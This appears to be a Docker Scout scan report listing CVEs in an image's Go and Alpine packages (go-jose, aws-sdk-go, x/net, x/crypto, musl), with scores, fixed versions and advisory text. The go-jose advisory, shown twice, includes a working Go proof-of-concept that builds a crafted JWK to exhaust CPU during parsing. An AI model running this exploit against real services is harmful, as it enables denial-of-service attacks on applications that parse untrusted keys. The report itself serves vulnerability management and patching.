---
hide_table_of_contents: true
---

<table>
<tr><td>digest</td><td><code>sha256:8b618974432fe8e1c6e801d8890387f74a21feb654562906e513a2bf032ec3fa</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/high-2-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/medium-3-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/low-1-fce1a9"/> <img alt="unspecified: 5" src="https://img.shields.io/badge/unspecified-5-lightgrey"/></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>104 MB</td></tr>
<tr><td>packages</td><td>271</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/go-jose/go-jose/v4</strong> <code>4.1.4</code> (golang)</summary>

<small><code>pkg:golang/github.com/go-jose/go-jose/v4@4.1.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-116587?s=github&n=v4&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C%3D4.1.5"><img alt="high 7.5: CVE--2026--116587" src="https://img.shields.io/badge/CVE--2026--116587-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Algorithmic Complexity</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=4.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.366%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

### Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

### Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

```go
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	// The RSA parameters can be complete junk. The CPU cost is in validating them.
	primeBits := 16384
	p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
	p.SetBit(p, 0, 1)
	n := new(big.Int).Lsh(big.NewInt(1), 2048)
	e := big.NewInt(65537)
	d := big.NewInt(3)
	q := big.NewInt(3)

	jwk := map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
		"d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
		"p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
		"q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
	}

	protected := map[string]any{
		"alg": "RS256",
		"jwk": jwk,
	}
	protJSON, _ := json.Marshal(protected)

	jws := map[string]string{
		"protected": base64.RawURLEncoding.EncodeToString(protJSON),
		"payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
		"signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
	}
	jwsJSON, _ := json.Marshal(jws)

	start := time.Now()
	_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
	elapsed := time.Since(start)

	fmt.Printf("prime bits: %d\n", primeBits)
	fmt.Printf("parse time: %s\n", elapsed)
	fmt.Printf("parse error: %v\n", err)
}
```

### Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

### Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-116586?s=github&n=v4&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C4.1.5"><img alt="medium 6.9: CVE--2026--116586" src="https://img.shields.io/badge/CVE--2026--116586-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Uncontrolled Recursion</i>

<table>
<tr><td>Affected range</td><td><code>&lt;4.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.292%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Parsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.

Note: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Impact

Denial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.

### Workarounds

Reject large inputs before parsing them.

### Acknowledgements

Thanks to Dohyun Kim (@<!-- -->azza999), Joshua Rogers of AISLE Research, and Sueun Cho for alerting us to the need to patch this.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-116585?s=github&n=v4&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C4.1.5"><img alt="medium 6.9: CVE--2026--116585" src="https://img.shields.io/badge/CVE--2026--116585-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Validation of Array Index</i>

<table>
<tr><td>Affected range</td><td><code>&lt;4.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.264%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC-HS512" can result in a panic on untrusted input.

Note this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Details

Insufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.

### Workarounds

If the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

### Impact

Denial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.

### Acknowledgements

Thanks to Joshua Rogers of AISLE Research for reporting this problem.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/go-jose/go-jose/v4</strong> <code>4.1.5</code> (golang)</summary>

<small><code>pkg:golang/github.com/go-jose/go-jose/v4@4.1.5</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-116587?s=github&n=v4&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C%3D4.1.5"><img alt="high 7.5: CVE--2026--116587" src="https://img.shields.io/badge/CVE--2026--116587-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Algorithmic Complexity</i>

<table>
<tr><td>Affected range</td><td><code>&lt;=4.1.5</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.366%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

### Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

### Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

```go
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	// The RSA parameters can be complete junk. The CPU cost is in validating them.
	primeBits := 16384
	p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
	p.SetBit(p, 0, 1)
	n := new(big.Int).Lsh(big.NewInt(1), 2048)
	e := big.NewInt(65537)
	d := big.NewInt(3)
	q := big.NewInt(3)

	jwk := map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
		"d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
		"p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
		"q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
	}

	protected := map[string]any{
		"alg": "RS256",
		"jwk": jwk,
	}
	protJSON, _ := json.Marshal(protected)

	jws := map[string]string{
		"protected": base64.RawURLEncoding.EncodeToString(protJSON),
		"payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
		"signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
	}
	jwsJSON, _ := json.Marshal(jws)

	start := time.Now()
	_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
	elapsed := time.Since(start)

	fmt.Printf("prime bits: %d\n", primeBits)
	fmt.Printf("parse time: %s\n", elapsed)
	fmt.Printf("parse error: %v\n", err)
}
```

### Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

### Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>github.com/aws/aws-sdk-go</strong> <code>1.55.8</code> (golang)</summary>

<small><code>pkg:golang/github.com/aws/aws-sdk-go@1.55.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2020-8911?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"><img alt="medium : CVE--2020--8911" src="https://img.shields.io/badge/CVE--2020--8911-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.346%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A padding oracle vulnerability exists in the AWS S3 Crypto SDK for GoLang versions prior to V2. The SDK allows users to encrypt files with AES-CBC without computing a Message Authentication Code (MAC), which then allows an attacker who has write access to the target's S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file, they can reconstruct the plaintext with (on average) 128*length (plaintext) queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors. It is recommended to update your SDK to V2 or later, and re-encrypt your files.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-8912?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"><img alt="low : CVE--2020--8912" src="https://img.shields.io/badge/CVE--2020--8912-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.231%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the in-band key negotiation exists in the AWS S3 Crypto SDK for GoLang versions prior to V2. An attacker with write access to the targeted bucket can change the encryption algorithm of an object in the bucket, which can then allow them to change AES-GCM to AES-CTR. Using this in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation. It is recommended to update your SDK to V2 or later, and re-encrypt your files.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>golang.org/x/net</strong> <code>0.60.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/net@0.60.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-97045?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.62.0"><img alt="unspecified : CVE--2026--97045" src="https://img.shields.io/badge/CVE--2026--97045-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.62.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.62.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.202%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In childTextNodesAreLiteral, walking up the tree previously stopped at the nearest foreign ancestor once an HTML integration point was found. However, that integration point may itself be a descendant of an element that was foster-parented into a foreign namespace (such as <mglyph> or <malignmark> fostered under <mtext>), causing a parser to resolve the subtree in a different foreign namespace upon re-parsing the rendered output.

Continue walking the full ancestor chain and verify that every transition from a non-empty namespace occurs at an HTML integration point before emitting literal text.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-78661?s=golang&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.62.0"><img alt="unspecified : CVE--2026--78661" src="https://img.shields.io/badge/CVE--2026--78661-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;0.62.0</code></td></tr>
<tr><td>Fixed version</td><td><code>0.62.0</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.185%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When coalescing adjacent text nodes in addText and fosterParent, appending to an existing TextNode's Data via string concatenation (n.Data += text) reallocated and copied the accumulated string on every token. Inputs containing many short text runs separated by ignored end tags (such as "a</x>") caused O(n^2) allocations and byte copies.

Accumulate coalesced text in per-node byte slices during parsing and materialize Data strings once at the end of parse.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>golang.org/x/crypto</strong> <code>0.57.0</code> (golang)</summary>

<small><code>pkg:golang/golang.org/x/crypto@0.57.0</code></small><br/>
<a href="https://scout.docker.com/v/GO-2026-5932?s=golang&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3E%3D0"><img alt="unspecified : GO--2026--5932" src="https://img.shields.io/badge/GO--2026--5932-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.

If you are required to interoperate with OpenPGP systems and need a maintained package, consider github.com/ProtonMail/go-crypto/openpgp which is a maintained fork that aims to be a drop-in replacement for this package.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>musl</strong> <code>1.2.6-r3</code> (apk)</summary>

<small><code>pkg:apk/alpine/musl@1.2.6-r3?arch=x86_64&distro=alpine-3.24.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-107891?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.24&vr=%3C1.2.6-r6"><img alt="unspecified : CVE--2026--107891" src="https://img.shields.io/badge/CVE--2026--107891-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.2.6-r6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.6-r6</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>musl-utils</strong> <code>1.2.6-r3</code> (apk)</summary>

<small><code>pkg:apk/alpine/musl-utils@1.2.6-r3?arch=x86_64&distro=alpine-3.24.3&upstream=musl</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-107891?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.24&vr=%3C1.2.6-r6"><img alt="unspecified : CVE--2026--107891" src="https://img.shields.io/badge/CVE--2026--107891-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1.2.6-r6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.2.6-r6</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>
</table>

